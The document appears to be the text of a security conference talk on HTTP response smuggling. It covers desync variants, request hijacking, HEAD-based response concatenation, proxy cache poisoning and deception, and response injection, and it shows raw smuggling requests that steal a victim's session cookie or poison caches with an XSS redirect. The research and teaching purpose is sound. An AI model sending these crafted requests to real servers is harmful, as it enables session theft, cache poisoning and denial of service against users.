Response Smuggling
Pwning HTTP/1.1 Connections
Agenda
-
HTTP Request Smuggling
-
Desynchronization Variants
-
Response Smuggling
-
Response Concatenation
-
Arbitrary Proxy Cache Poisoning/Deception
-
Response Scripting
HTTP Request Smuggling
HTTP Request Smuggling
-
Attack introduced in 2005 by Watchfire
-
Abuse discrepancies between Front-end and Back-end Server
-
Multiple message-length directives in one request
GET /example HTTP/1.1
Host: www.vulnerable.com
Content-Length: 32
Content-Length: 5
AAAAAGET /DeleteMyAccount HTTP/1.1
X: GET /myAccount HTTP/1.1
Host: www.vulnerable.com
Cookie: sessionID=1234
HTTP Request Smuggling
-
Desync Variants
-
Techniques to force discrepancy between servers
-
Headers are “hidden” from HTTP parsers
-
“Reborned” in 2019 by James Kettle
-
Real methodology to Detect - Confirm - Explore - Exploit
-
Demonstration of real systems being exploited… Bounties! 
Connection Desync
-
End-to-End vs Hop-by-Hop Headers
-
Connection: Connection_Option
-
Directives “close”, “keep-alive”, 
-
Connection Headers deleted when forwarded
GET /Hello HTTP/1.1
Host: www.vulnerable.com
Connection: Content-Length
Content-Length: 13
SMUGGLED_DATA
Request Smuggling Exploitation
-
Bypass Front-End controls (not Authentication)
-
Hijack Requests (only if data is stored and retrieved...)
-
Upgrades existing vulnerabilities (XSS, Open-Redirect)
-
Web Cache Attacks (Cache-Control ignored…)
Response Smuggling
HTTP Response Smuggling
-
Inject a complete message in the Response Queue
-
HTTP Desyn & HTTP Response Splitting
-
Proxy fails to match Requests with corresponding Responses 
GET /example HTTP/1.1
Host: www.vulnerable.com
GET /hello HTTP/1.1
Host: www.vulnerable.com
POST /LoginAction HTTP/1.1
Host: www.vulnerable.com
….
User=admin&pass=abc123
HTTP Response Smuggling
HTTP Pipelining
HTTP Pipeline Desync
-
Pipelining not “Enforced”
-
Send through free connections
-
If MaxConn reached: pipeline || wait
-
Responses not “stored”
-
Connection closed
HTTP Pipeline Desync
-
Smuggle Time consuming request
-
Send requests with same time delay: Concurrency vs Speed
Nested Smuggled Requests
Multiple Nested Injections
-
Smuggle more than one request
-
Distribute malicious payloads (N XSS requests)
-
Denial of Service
-
One request produce N responses
-
Consume proxy connections and backend resources (CPU, Memory)
Request Hijacking
-
Request content reflected in victim’s response (no storage required)  
-
Desynchronization to obtain victim’s response
GET /example HTTP/1.1
Host: www.vulnerable.com
GET /sleepy HTTP/1.1
Host: www.vulnerable.com
POST /reflect HTTP/1.1
Host: www.vulnerable.com
Content-Length: 100000
ReflectedContent=GET /myAccount HTTP/1.1
Cookie: SecretSessionCookie=ABCDEF1234; ,,,
ATTACKER
VICTIM
HTTP/1.1 200 OK
Content-Type: text/html
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 75
Input param GET /myAccount HTTP/1.1
Cookie: SecretSessionCookie=ABCDEF1234
Response Concatenation
Response Length
-
Some messages MUST NOT contain body (RFC)
-
Responses to HEAD Requests
-
Content-Length is allowed and MUST contain same GET value 
What if a Proxy fails to match Responses with original requests?
Response Desynchronization
-
Responses as building blocks (Concatenating)  
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 50
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 50
 Hello World 
GET /example HTTP/1.1
Host: www.vulnerable.com
HEAD /HelloWorld HTTP/1.1
Host: www.vulnerable.com
GET /HelloWorld HTTP/1.1
Host: www.vulnerable.com
GET /somePage HTTP/1.1
Host: www.vulnerable.com
-
Last response is built using remaining bytes (Splitting)
G
G
G
G
HTTP Response Desync
Content Confusion
-
Headers used as Body
-
Data reflected in Headers: building an XSS
-
Content-Type specified by HEAD response
-
Reflection in “safe” responses (text/plain, application/json)
HEAD /welcomePage HTTP/1.1
Host: www.vulnerable.com
GET /redir? HTTP/1.1
Host: www.vulnerable.com
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 100
HTTP/1.1 302 Found
Location: 
www.vulnerable.com?
DEMO
Proxy Cache Poisoning/Deception
Proxy Cache Poisoning
-
Proxy cache uses Cache-Control header (RFC)
-
HEAD response with Cache-Control (client pipelining: no need for sleepy request)
GET /example HTTP/1.1
Host: www.vunerable.com
Content-Length: 54
Connection: Content-Length
HEAD /home.html HTTP/1.1
Host: www.vulnerable.com
POST /redirect HTTP/1.1
Host: www.vulnerable.com
Content-Length: 33
ref=
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 18
This is an example
HTTP/1.1 200 OK
Content-Type: text/html
Cache-Control: public, max-age=7200
Content-Length: 77
HTTP/1.1 302 Found
Location: 
www.vulnerable.com/alert(‘XSS’)
G
G
G
G
HTTP Response Desync
G
Proxy Web Cache
G
Proxy Cache Poisoning
-
Proxy cache gets poisoned by Cache-Control header
-
Every URL can get poisoned arbitrarily
-
Cached response can contain a payload (XSS, Open Redirect, XSRF)
-
DoS by poisoning all URLs with static 404 response
-
Pipelining is created at client and forwarded as RFC specifies 
Proxy Cache Deception
GET /example HTTP/1.1
Host: www.vunerable.com
Content-Length: 54
Connection: Content-Length
HEAD /home.html HTTP/1.1
Host: www.vulnerable.com
GET /myAccount HTTP/1.1
Host: www.vulnerable.com
Cookie: mySessionCookie=abc123
HTTP/1.1 200 OK
Content-Type: text/html
Cache-Control: public, max-age=7200
Content-Length: 77
HTTP/1.1 200 OK
Content-Type: text/html
Hello Victim
Secret Data: ...
DEMO
Arbitrary Response Injection
Response Splitting
GET /example HTTP/1.1
Host: www.vulnerable.com
Connection: Content-Length
Content-Length: 241
HEAD /HelloWorld HTTP/1.1
Host: www.vulnerable.com
POST /reflection HTTP/1.1
Host: www.vulnerable.com
Content-Length: 137
ReflectedParam=AAAAAAAAAHTTP/1.1 OK 200
Cache-Control: max-age=9000
Content-Type: text/html
Content-Length: 20
Arbitrary Response
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 100
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length:120
Your parameter input was: AAAAAAAAAHTTP/1.1 
OK 200
Cache-Control: max-age=9000
Content-Type: text/html
Content-Length: 20
Arbitrary Response
Conclusions
-
Response Smuggling does NOT rely on extra vulnerabilities (RFC).
-
Response/Request Hijack = Confidentiality compromised
-
Proxy Cache Poisoning / Nested Injection = Availability compromised
-
Response Scripting / Request Smuggling = Integrity compromised
-
Arbitrary Response Writing + Cache = Client completely compromised
-
Sleepy Request + Timing = Great increase in Reliability
Questions?
Twitter: @tincho_508
Email: PI:EMAIL